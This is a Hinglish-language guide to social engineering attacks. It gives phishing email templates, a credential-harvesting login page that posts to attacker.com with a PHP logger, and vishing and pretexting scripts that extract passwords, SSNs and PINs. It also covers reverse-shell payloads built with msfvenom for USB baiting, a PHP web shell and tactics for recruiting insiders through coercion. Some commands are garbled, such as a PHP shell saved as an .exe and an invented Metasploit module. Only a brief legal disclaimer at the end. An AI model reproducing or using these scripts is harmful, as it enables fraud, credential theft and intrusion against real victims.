# Social Engineering — Professional Guide

**Advanced Social Engineering Techniques**

---

## 1. Phishing aur Email Spoofing

**Objective:** Fake emails bhejkar credentials ya data churai karna.

```bash
# Phishing email setup
use exploit/phishing/sendmail

# Email spoofing
set TEMPLATE banking
set EMAIL "support@bank.com"
set SUBJECT "Urgent: Verify Your Account"
set TO "victim@gmail.com"

# Send phishing campaign
run
```

### HTML Email Crafting

```html
<html>
<head>
    <title>Account Verification</title>
</head>
<body>
    <center>
        <h2>Important: Verify Your Account</h2>
        <p>Click below to verify your account:</p>
        <a href="http://attacker.com/phish.html?session=TRACKING_ID">Verify Account</a>
        <p>Or copy and paste this link:</p>
        <p>http://attacker.com/phish.html</p>
        
        <h3>Account Details (Don't Share):</h3>
        <form>
            <input type="text" placeholder="Username" name="user">
            <input type="password" placeholder="Password" name="pass">
            <input type="submit" value="Verify">
        </form>
    </center>
</body>
</html>
```

---

## 2. Spear Phishing - Targeted Attacks

**Objective:** Specific person ko target karke compromise karna.

```bash
# OSINT - Information gathering
# LinkedIn research
# Company website analysis
# Email pattern recognition

# Email finder
theHarvester -d company.com -b bing

# Domain research
whois company.com
nslookup company.com

# Email validation
curl -s https://haveibeenpwned.com/api/v2/breachedaccount/email@company.com
```

### Targeted Email

```
From: it-support@company.com
To: victim@company.com
Subject: Action Required: Security Update

Dear John,

We need to update your security credentials.
Please click the link below:

http://attacker.com/login.html?user=john

IT Support Team
```

---

## 3. Credential Harvesting Pages

**Objective:** Fake login page banakar credentials churai karna.

```bash
# Cloning target website
wget -r -p -E -P clone http://target.com/login

# Modify HTML
cat > clone/index.html << 'EOF'
<html>
<body>
<h2>Login to Your Account</h2>
<form action="http://attacker.com/capture.php" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
</body>
</html>
EOF

# Start web server
python3 -m http.server 80

# Capture credentials
cat > capture.php << 'EOF'
<?php
$username = $_POST['username'];
$password = $_POST['password'];
file_put_contents('credentials.txt', "$username:$password\n", FILE_APPEND);
header('Location: http://legitimate-site.com');
?>
EOF
```

---

## 4. Pretexting - Social Manipulation

**Objective:** Psychological manipulation se sensitive information achieve karna.

### Phone Pretexting

```
Script:
"Hi, I'm calling from IT Support. We're doing a security audit.
Can you verify your network username and last password you used?"

Variations:
- "We're updating our password system, can you confirm..."
- "We detected unauthorized access, please verify..."
- "This is a routine security check..."
```

### Email Pretexting

```
Scenario: Impersonating HR

"Hi Sarah,

As part of our annual employee verification process,
we need to collect some information.

Please respond with:
- Employee ID
- Department
- Manager Name
- Salary

HR Department"
```

---

## 5. Vishing - Voice Social Engineering

**Objective:** Phone calls ke through fooled karna.

```bash
# VoIP setup
ast_manager_user = "admin"
ast_manager_pass = "password"

# Automated vishing
use auxiliary/voip/vishing
set TARGET_NUMBER "555-1234"
set MESSAGE "This is your bank. Click 1 to verify account"
run
```

### Vishing Script

```
"Hello, this is Bank of America Fraud Department.
We detected unusual activity on your account.

Please press 1 to verify your identity.
Or say 'agent' to speak to a representative."

# Collect info:
- Account number
- SSN (last 4 digits)
- PIN
- Card information
```

---

## 6. USB Baiting aur Physical Attacks

**Objective:** Physical media ke through malware inject karna.

```bash
# USB payload creation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > autorun.exe

# Create autorun.inf
cat > autorun.inf << 'EOF'
[autorun]
open=autorun.exe
icon=autorun.exe
EOF

# Copy to USB
cp autorun.exe /media/usb/
cp autorun.inf /media/usb/

# Social engineering labels
echo "CONFIDENTIAL - CEO Files" > /media/usb/README.txt
```

---

## 7. Baiting - Temptation-based Social Engineering

**Objective:** Temptation se users ko malicious files download karana.

```bash
# Create fake videos/documents
echo '<?php system($_GET["cmd"]); ?>' > VideoPlayer.exe

# Host on fake site
wget -q https://movies-download.xyz/VideoPlayer.exe

# Or file sharing sites
# Upload on mediafire, 4shared, etc.

# Social media lure
"FREE MOVIE DOWNLOAD - Click here!"
"HOT CELEBRITY PHOTOS - Download now!"
```

---

## 8. OSINT - Information Gathering

**Objective:** Target organization ke baare mein maximum info nikal na.

```bash
# Shodan search
shodan search "organization" --fields ip_str,port,os

# Google dorking
site:company.com filetype:pdf
site:company.com inurl:admin
site:company.com intext:password

# LinkedIn
# Search for employees
# Job descriptions
# Connection analysis

# Domain research
whois company.com
nslookup company.com
dig company.com

# Email harvesting
theHarvester -d company.com -b all

# Social media
# Twitter, Facebook, Instagram research
# Employee list building
```

---

## 9. Insider Threat Cultivation

**Objective:** Company ke andar se insider develop karna.

```bash
# Target selection
# Disgruntled employees
# Financial problems
# Low-paid positions

# Recruitment strategy
# Flattery
# Financial incentives
# Leverage compromising info
# Peer pressure

# Information exchange
# Source code
# Trade secrets
# Customer lists
# Strategic plans
```

---

## 10. Advanced Social Engineering Combo

**Objective:** Multiple techniques combine karke complete success.

```bash
# Phase 1: OSINT
theHarvester -d target.com -b all
Linkedin employee research
Google dorking

# Phase 2: Email campaign
# Spear phishing email with trojan attachment
msfvenom -p windows/meterpreter/reverse_tcp -f exe > resume.exe

# Phase 3: Landing page
# Fake HR login
# Credentials harvesting

# Phase 4: Phone follow-up
# "Did you receive the email?"
# "Have you updated your profile?"

# Phase 5: Exploitation
# Compromised account login
# Lateral movement
# Data exfiltration
```

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Social Engineering sirf authorized testing mein karo!

✓ Company ke written permission se
✓ Penetration testing scope mein
✓ Authorized personnel only

✗ Unauthorized social engineering fraud hai
✗ Criminal penalties possible
✗ Civil liability

Ethically aur legally approach karo!
```

---

**Banaya Gaya:** Social Engineering Database  
**Classification:** Human Exploitation  
**Skill Level:** Advanced  
**Risk Level:** High
